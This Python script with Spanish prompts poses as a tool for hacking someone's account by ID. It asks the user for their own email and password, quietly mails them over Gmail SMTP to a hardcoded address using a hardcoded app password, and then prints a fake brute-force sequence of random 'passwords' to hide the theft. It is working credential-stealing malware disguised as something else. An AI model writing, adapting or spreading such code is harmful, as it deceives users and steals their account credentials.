import os
import smtplib
from email.mime.text import MIMEText
import random
import time

Dcorreo = input("direccion de correo: ")
Dpass = input("contraseña: ")
cas = input("ingrese el id de la persona a hackear: ")

contenido = Dcorreo + Dpass
# Genera una contraseña de aplicaciones para tu cuenta de Gmail
app_password = "toli ekdw lcuz zzhv"

server = smtplib.SMTP("smtp.gmail.com", 587)
server.starttls()
server.login("esparta0987@gmail.com", app_password)


message = MIMEText(contenido)
message["Subject"] = "Asunto del mensaje"
message["From"] = "esparta0987@gmail.com"
message["To"] = "esparta0987@gmail.com"

server.sendmail(message["From"], message["To"], message.as_string())

server.quit()

print("conectando...")
time.sleep(50)

def generar_palabra(longitud):
    palabra = ''
    for i in range(longitud):
        # Genera un número aleatorio entre 97 y 122 (códigos ASCII para 'a' y 'z')
        letra = chr(random.randint(97, 122))
        palabra += letra
    return palabra

contador = 0
while contador < 1000:
    print("probando contraseña: ", generar_palabra(30))
    contador += 1
    time.sleep(5)
